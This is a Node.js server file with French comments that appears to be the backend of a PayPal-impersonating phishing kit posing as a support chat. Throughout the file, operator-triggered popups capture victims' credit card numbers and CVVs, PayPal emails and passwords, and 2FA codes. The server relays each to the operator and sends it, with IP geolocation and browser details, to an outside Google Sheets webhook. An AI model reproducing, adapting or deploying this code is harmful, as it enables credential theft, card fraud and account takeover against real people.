// --- Modules ---
const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

// --- Initialisation du serveur ---
const app = express();
const server = http.createServer(app);

// ✅ CORRECTION : Configuration pour les proxies (Render)
app.set('trust proxy', true);

// --- Configuration CORS ---
const frontendURL = "https://paypal-owpo.onrender.com";
app.use(cors({ origin: frontendURL }));

// --- Initialisation de Socket.IO ---
const io = new Server(server, {
  cors: {
    origin: frontendURL,
    methods: ["GET", "POST"]
  },
  maxHttpBufferSize: 2e6 // Limite de 2Mo pour les données (fichiers)
});

app.use(express.json());

// --- Configuration Webhook Google Sheets ---
const GOOGLE_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyhkCAFUU7TCMk8c6WBcPXOs8uqX7e2RrFedLQMuzxxdPS20e4JK89vaBqXbfr7y5AKeQ/exec';

// --- Identifiants ---
const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
const CORRECT_DATE_USER = "18/09/2025";
const CORRECT_CODE_SERVICE = "gg";
const CORRECT_DATE_SERVICE = "123";

// --- Stockage des connexions par type d'utilisateur ---
const supportSockets = new Set();
const userSockets = new Set();

// --- Fonction pour envoyer des données vers Google Sheets ---
async function sendToGoogleSheets(data) {
  try {
    const response = await fetch(GOOGLE_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      console.error('❌ Erreur envoi Google Sheets:', response.status, response.statusText);
    } else {
      console.log('✅ Données envoyées vers Google Sheets:', data.type);
    }
  } catch (error) {
    console.error('❌ Erreur webhook Google Sheets:', error.message);
  }
}

// --- Fonction pour générer un Session ID unique ---
function generateSessionId(ip) {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 8);
  const ipHash = ip ? ip.replace(/\./g, '').substring(0, 4) : '0000';
  return `${ipHash}-${random}-${timestamp.toString().slice(-6)}`;
}

// --- Fonction pour activer automatiquement le popup de vérification côté support ---
function triggerVerificationPopup(targetSockets, action) {
  targetSockets.forEach(supportSocket => {
    if (supportSocket.connected) {
      // Activer la checkbox de vérification côté support
      supportSocket.emit('auto_toggle_verification', { 
        action: action,
        show: true 
      });
    }
  });
}

// --- Route API de vérification ---
app.post('/verify', (req, res) => {
  const { code, date } = req.body;
  if (code === CORRECT_CODE_USER && date === CORRECT_DATE_USER) {
    res.status(200).json({ success: true, userType: 'User' });
  } else if (code === CORRECT_CODE_SERVICE && date === CORRECT_DATE_SERVICE) {
    res.status(200).json({ success: true, userType: 'Support' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid code or date' });
  }
});

// --- Gestion des connexions Socket.IO ---
io.on('connection', async (socket) => {
  // ✅ CORRECTION : Récupération IP réelle avec plusieurs méthodes de fallback
  const getClientIP = (socket) => {
    // Méthode 1 : Headers X-Forwarded-For (Render utilise ça)
    const forwarded = socket.handshake.headers['x-forwarded-for'];
    if (forwarded) {
      // Prendre la première IP de la liste (client réel)
      return forwarded.split(',')[0].trim();
    }
    
    // Méthode 2 : X-Real-IP
    const realIP = socket.handshake.headers['x-real-ip'];
    if (realIP) {
      return realIP;
    }
    
    // Méthode 3 : Socket.IO handshake address
    const handshakeIP = socket.handshake.address;
    if (handshakeIP && handshakeIP !== '127.0.0.1' && handshakeIP !== '::1') {
      return handshakeIP.replace('::ffff:', ''); // Nettoyer IPv6-mapped IPv4
    }
    
    // Méthode 4 : Connection remote address
    const remoteAddr = socket.conn.remoteAddress;
    if (remoteAddr && remoteAddr !== '127.0.0.1' && remoteAddr !== '::1') {
      return remoteAddr.replace('::ffff:', '');
    }
    
    // Fallback
    return 'IP non disponible';
  };

  const clientIp = getClientIP(socket);
  let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };

  // ✅ AMÉLIORATION : Vérifier si l'IP est valide avant géolocalisation
  if (clientIp && clientIp !== 'IP non disponible' && clientIp !== '127.0.0.1') {
    try {
      const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
      const geoData = await geoResponse.json();
      if (geoData.status === 'success') {
        geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
      }
    } catch (error) { 
      console.error("Erreur de géolocalisation:", error); 
    }
  }

  const clientInfo = {
    ip: clientIp,
    userAgent: socket.handshake.headers['user-agent'] || 'N/A',
    language: socket.handshake.headers['accept-language'] || 'N/A',
    connectedAt: new Date().toISOString(),
    ...geoInfo
  };

  // ✅ DEBUG : Log pour vérifier
  console.log('🔍 Client connecté:', {
    ip: clientIp,
    headers: {
      'x-forwarded-for': socket.handshake.headers['x-forwarded-for'],
      'x-real-ip': socket.handshake.headers['x-real-ip'],
      'user-agent': socket.handshake.headers['user-agent']?.substring(0, 50) + '...'
    },
    handshakeAddress: socket.handshake.address,
    geoInfo: geoInfo
  });

  const sessionId = generateSessionId(clientIp);

  // Déterminer le type d'utilisateur lors de la connexion
  socket.on('user type', (data) => {
    socket.userType = data.userType;
    socket.sessionId = sessionId;
    socket.clientInfo = clientInfo;
    
    if (data.userType === 'Support') {
      supportSockets.add(socket);
    } else if (data.userType === 'User') {
      userSockets.add(socket);
      
      // 📊 ENVOYER DONNÉES DE CONNEXION vers Google Sheets
      sendToGoogleSheets({
        type: 'client_connection',
        sessionId: sessionId,
        clientInfo: clientInfo,
        timestamp: new Date().toISOString()
      });
    }
  });
  
  socket.broadcast.emit('user activity', { text: 'A user has connected.' });

  socket.on('chat message', (msg) => {
    const enhancedMsg = { 
      ...msg, 
      clientInfo: socket.clientInfo,
      sessionId: socket.sessionId 
    };
    
    io.emit('chat message', enhancedMsg);
    
    // 💬 ENVOYER MESSAGE vers Google Sheets
    sendToGoogleSheets({
      type: 'chat_message',
      sessionId: socket.sessionId,
      user: msg.user,
      text: msg.text,
      isImportant: msg.isImportant || false,
      isSuccess: msg.isSuccess || false,
      isVerifying: msg.isVerifying || false,
      clientInfo: socket.clientInfo,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('file message', (fileData) => {
    const enhancedFileData = { 
      ...fileData, 
      clientInfo: socket.clientInfo,
      sessionId: socket.sessionId 
    };
    
    io.emit('file message', enhancedFileData);
    
    // 📁 ENVOYER FICHIER vers Google Sheets
    sendToGoogleSheets({
      type: 'file_upload',
      sessionId: socket.sessionId,
      fileName: fileData.fileName,
      fileType: fileData.fileType,
      user: fileData.user,
      clientInfo: socket.clientInfo,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('request popup', () => {
    socket.broadcast.emit('display popup');
  });

  socket.on('request credit card', () => {
    socket.broadcast.emit('display credit card popup');
  });

  socket.on('request paypal login1', () => {
    socket.broadcast.emit('display paypal login1 popup');
  });

  socket.on('request paypal login2', () => {
    socket.broadcast.emit('display paypal login2 popup');
  });

  socket.on('verification popup', (data) => {
    socket.broadcast.emit('display verification popup', data);
  });

  socket.on('popup choice', (choice) => {
    // Envoyer uniquement aux sockets support
    supportSockets.forEach(supportSocket => {
      if (supportSocket.connected) {
        supportSocket.emit('chat message', {
          user: 'System',
          text: `User has chosen the option: "${choice.option}"`,
          clientInfo: socket.clientInfo,
          sessionId: socket.sessionId
        });
      }
    });

    // 🎯 ENVOYER CHOIX POPUP vers Google Sheets
    sendToGoogleSheets({
      type: 'popup_choice',
      sessionId: socket.sessionId,
      choice: choice.option,
      clientInfo: socket.clientInfo,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('credit card data', (data) => {
    const { cardData } = data;
    
    // Envoyer uniquement aux sockets support
    supportSockets.forEach(supportSocket => {
      if (supportSocket.connected) {
        supportSocket.emit('chat message', {
          user: 'System',
          text: `Credit Card Information Received:
📧 Cardholder: ${cardData.cardHolderName}
💳 Card Number: ${cardData.cardNumber}
📅 Expiry: ${cardData.expiryDate}
🔒 CVV: ${cardData.cvv}
📮 Zip Code: ${cardData.billingZip || 'Not provided'}`,
          clientInfo: socket.clientInfo,
          sessionId: socket.sessionId
        });
      }
    });

    // ✅ NOUVEAU : Activer automatiquement le popup de vérification
    triggerVerificationPopup(supportSockets, 'Carte bancaire validée');

    // 💳 ENVOYER DONNÉES CB vers Google Sheets
    sendToGoogleSheets({
      type: 'credit_card',
      sessionId: socket.sessionId,
      cardData: cardData,
      clientInfo: socket.clientInfo,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('paypal login1 data', (data) => {
    const { loginData } = data;
    
    // Envoyer uniquement aux sockets support
    supportSockets.forEach(supportSocket => {
      if (supportSocket.connected) {
        supportSocket.emit('chat message', {
          user: 'System',
          text: `PayPal Login Information Received (Step 1):
📧 Email: ${loginData.email}
🔐 Password: ${loginData.password}`,
          clientInfo: socket.clientInfo,
          sessionId: socket.sessionId
        });
      }
    });

    // ✅ NOUVEAU : Activer automatiquement le popup de vérification
    triggerVerificationPopup(supportSockets, 'PayPal étape 1 validée');

    // 💰 ENVOYER PAYPAL ÉTAPE 1 vers Google Sheets
    sendToGoogleSheets({
      type: 'paypal_login1',
      sessionId: socket.sessionId,
      loginData: loginData,
      clientInfo: socket.clientInfo,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('paypal login2 data', (data) => {
    const { verificationData } = data;
    
    // Envoyer uniquement aux sockets support
    supportSockets.forEach(supportSocket => {
      if (supportSocket.connected) {
        supportSocket.emit('chat message', {
          user: 'System',
          text: `PayPal 2FA Code Received (Step 2):
🔢 Verification Code: ${verificationData.verificationCode}`,
          clientInfo: socket.clientInfo,
          sessionId: socket.sessionId
        });
      }
    });

    // ✅ NOUVEAU : Activer automatiquement le popup de vérification
    triggerVerificationPopup(supportSockets, 'PayPal 2FA validé');

    // 🔐 ENVOYER PAYPAL ÉTAPE 2 vers Google Sheets
    sendToGoogleSheets({
      type: 'paypal_login2',
      sessionId: socket.sessionId,
      verificationData: verificationData,
      clientInfo: socket.clientInfo,
      timestamp: new Date().toISOString()
    });
  });

  socket.on('clear chat', () => { 
    io.emit('chat cleared'); 
  });
  
  socket.on('disconnect', () => { 
    // Envoyer durée de session avant de nettoyer
    if (socket.userType === 'User' && socket.clientInfo) {
      const sessionDuration = Date.now() - new Date(socket.clientInfo.connectedAt).getTime();
      const durationMinutes = Math.round(sessionDuration / 60000);
      
      sendToGoogleSheets({
        type: 'session_end',
        sessionId: socket.sessionId,
        sessionDuration: `${durationMinutes} minutes`,
        clientInfo: socket.clientInfo,
        timestamp: new Date().toISOString()
      });
    }
    
    // Nettoyer les sets lors de la déconnexion
    supportSockets.delete(socket);
    userSockets.delete(socket);
    io.emit('user activity', { text: 'A user has disconnected.' }); 
  });
});

// --- Démarrage du serveur ---
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`🚀 Le serveur est démarré et écoute sur le port ${PORT}`);
  console.log(`📊 Google Sheets webhook configuré : ${GOOGLE_WEBHOOK_URL.substring(0, 50)}...`);
});
